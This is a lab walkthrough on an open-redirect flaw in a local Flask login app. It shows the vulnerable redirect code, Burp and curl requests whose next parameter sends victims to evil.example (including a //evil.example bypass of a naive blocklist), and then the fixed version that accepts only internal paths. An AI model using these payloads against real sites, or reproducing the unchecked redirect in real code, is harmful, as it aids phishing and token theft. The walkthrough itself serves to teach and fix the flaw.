# Walkthrough — open-redirect

The app has a login form with the common "return you to where you were" pattern: the destination it should send you back to rides in a `next` parameter (`/login?next=/dashboard`). Log in with valid credentials and, on success, the server answers `302 Found` with `Location: <next>`, and the browser follows it. The problem: the server puts *whatever* `next` says into that `Location`, without checking the destination is one of its own pages. Send `next=http://evil.example` and the login response redirects the victim clean off the site — to the attacker. The proof is server-side and sits right in the response: the `Location` header of the `302`. Everything here is done in Burp (or `curl -i`); there is no browser step, because the redirect is decided and visible on the wire.

## 1. Context

The `vulnerable` app is on `127.0.0.1:8024` and the `fixed` app on `127.0.0.1:8124`; there is no database and no second service. `GET /login` shows a login form that carries the `next` value in a hidden field, prefilled from the query string. `POST /login` with the demo credentials (`demo` / `demo`) succeeds and redirects to `next`. `GET /dashboard` is the internal landing page you are meant to return to.

This is an **open redirect**: the app redirects the user to a destination taken from user input without checking that the destination is its own. Terms used below:

- **`next` parameter** (also seen as `returnUrl`, `redirect_to`, `continue`): the value carrying "where to send the user back to" after an action like login.
- **relative path** (`/dashboard`): a destination *within* this site — no host, resolved against the current origin.
- **absolute URL** (`https://host/path`): a destination with its own scheme and host — another site.
- **protocol-relative URL** (`//host`): a URL with no scheme; the browser resolves it against the current scheme, so `//evil.example` becomes `https://evil.example` — another site. This is the form a naive `http://` filter misses.
- **`Location` header**: the response header on a `3xx` redirect that tells the browser where to go.

This is **A01 — Broken Access Control** (CWE-601, "URL Redirection to Untrusted Site"): the control that is missing is over *where the app may send the user*. The exploration is done entirely in Burp; `curl -i` is the equivalent.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). On a successful login the view redirects like this:

```python
if request.form.get("username") == "demo" and request.form.get("password") == "demo":
    next_url = request.form.get("next", "/dashboard")
    # VULNERABLE: redirect to a user-controlled destination with NO check that it
    # points inside our own site ...
    return redirect(next_url)
```

`redirect(next_url)` sets `Location: <next_url>` and returns a `302`. `next_url` is the raw value the client sent — nothing checks that it points inside this site. Audit question: *the destination comes straight from my input, and the server never asks "is this one of my own pages?"* — so any URL I put in `next` becomes the `Location`. The fix (foreshadowed): let the **server** decide the destination — accept only an internal path.

## 3. Exploitation via Burp Suite

Configure Burp Proxy and point your browser at it. Visit <http://127.0.0.1:8024/>, submit the login form once (`demo` / `demo`) to capture the traffic, then right-click the `POST /login` request in **Proxy → HTTP history** and choose **Send to Repeater**.

The redirect fires on `POST /login`, so that is what we work in Repeater. The attacker delivers the malicious `next` with a GET link — `/login?next=<destination>` — and the login form carries that value into the POST as a hidden field, so a victim logging in normally sends it right back. Testing the `POST /login` directly exercises the exact request the victim's browser makes. The proof is the response's status line and `Location` header, so **do not follow the redirect** (in curl, no `-L`).

### Step 1 — Baseline: the feature works

Request in Repeater:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8024
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

username=demo&password=demo&next=/dashboard
```

Response (headers only — the `302` is the whole point):

```
HTTP/1.1 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 207
Location: /dashboard
```

The equivalent with curl:

```bash
curl -i http://127.0.0.1:8024/login -d 'username=demo&password=demo&next=/dashboard'
```

`Location: /dashboard` is a **relative path** — the browser stays on the target and lands on the internal dashboard. That is the legitimate "return you to where you were". From here on, only the `next` value changes.

### Step 2 — Redirect the victim off-site (the attack)

Change `next` to an absolute URL pointing at the attacker's site:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8024
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

username=demo&password=demo&next=http://evil.example
```

Response:

```
HTTP/1.1 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 225
Location: http://evil.example
```

`Location: http://evil.example` — the login response now sends the victim to **another host**. The link that started this was `http://127.0.0.1:8024/login?next=http://evil.example`: it begins on the target's own domain (which the victim trusts and where they really log in), and the target itself bounces them to the attacker. That is the open redirect. (`evil.example` is a reserved documentation TLD — it resolves to nothing, and the app never connects to it; it only *emits* the `Location`.)

### Step 3 — The `//` payload a blocklist misses

A developer who "fixes" this by blocking `http://` still loses. Send a **protocol-relative** URL — no scheme:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8024
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

username=demo&password=demo&next=//evil.example
```

Response:

```
HTTP/1.1 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 215
Location: //evil.example
```

`Location: //evil.example` has no `http://` or `https://` for a string filter to match — but a browser resolves `//evil.example` against the current scheme, making it `https://evil.example`. Same off-site redirect, past the naive filter. (Werkzeug passes the `Location` through verbatim here; older versions rewrote relative locations to absolute, which is exactly why the bytes are worth capturing rather than assuming.)

## 4. What the vuln is NOT

The exploit is just a value in a parameter, so it is easy to draw the wrong lesson. Isolate the real cause:

- **It is NOT XSS.** Nothing is injected into a page and no script runs; the server only emits a `Location` header on a `302`. There is no HTML/JS sink here — just a redirect.
- **It is NOT CSRF.** No state-changing action happens on the target, and no cookie is involved (this login keeps no session at all — the redirect fires the same with or without one). Where `csrf-basic` makes the target *act* on the victim's behalf using the cookie the browser attaches automatically, an open redirect makes the target *send the victim away* and touches nothing on the target. "Cross-site" here means the destination is another site, not that anything ran on the target.
- **It is NOT a legitimate redirect.** A real login `next` is always an internal path — the app has no reason to send you to another host. **Proof of isolation:** `next=/dashboard` returns `Location: /dashboard` on **both** the vulnerable and the fixed app (Step 1). Only the *external* destination separates them.

The one thing it **is**: the server trusts a user-controlled destination and emits it as the `Location`, sending the victim off-site. The only fix is to let the **server** decide the destination — accept only an internal path.

## 5. Impact

**On its own, low; as a link in a chain, real.** An open redirect leaks no data, runs no code, and changes nothing on the target — by itself it just relocates the browser. Its value to an attacker is credibility and chaining:

- **Phishing.** The malicious link *starts* on the trusted domain (`http://127.0.0.1:8024/login?next=...`); the victim vets that domain, logs in for real, and only then is bounced to a look-alike attacker page primed to harvest what comes next. The trusted origin lends the whole lure credibility.
- **Token theft in OAuth / SSO.** When a redirect target (a `redirect_uri` or a post-login return) is under-validated, an open redirect can divert an authorization code or token to the attacker's destination.

This atom proves the redirect off-site; the escalation above is the class's real-world reach — described here, not built. No overclaim.

## 6. Why the fix works

See [`DIFF.md`](./DIFF.md) for the change. The fixed app passes `next` through `safe_next()`, which accepts only an internal path (no scheme, no host, no protocol-relative `//`, no `\` trick) and otherwise falls back to `/dashboard`. Replay the attack against <http://127.0.0.1:8124/login>:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8124
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

username=demo&password=demo&next=http://evil.example
```

Response:

```
HTTP/1.1 302 FOUND
Content-Length: 207
Location: /dashboard
```

The external destination is refused and replaced with the safe internal default — `Location: /dashboard`, not `http://evil.example`. The `//evil.example` payload is blocked the same way (it also comes back `Location: /dashboard`), because the structural check rejects any destination carrying a host, not just ones spelled `http://`. Meanwhile the legitimate `next=/dashboard` still returns `Location: /dashboard` on both apps, so the feature is intact; only off-site destinations change. The whole fix is the server deciding the destination — an allowlist of structure (is this an internal path?), not a blocklist of strings. See [`DIFF.md`](./DIFF.md) for why a blocklist loses and why an internal path is enough here.
